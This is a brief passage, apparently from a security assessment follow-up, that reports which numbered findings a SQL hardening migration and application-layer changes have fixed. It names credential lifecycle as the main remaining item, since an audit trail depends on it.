Findings 1, 2, 3 and 9 shipped together as `0011_security_hardening.sql`, and findings 4-7 shipped as application-layer changes. The numbering above reflects the original assessment, so items 1-7 and 9 are now done. The highest-value remaining item is finding 8 (credential lifecycle), which underpins the `created_by` audit trail that findings 1, 2 and 9 all now depend on.
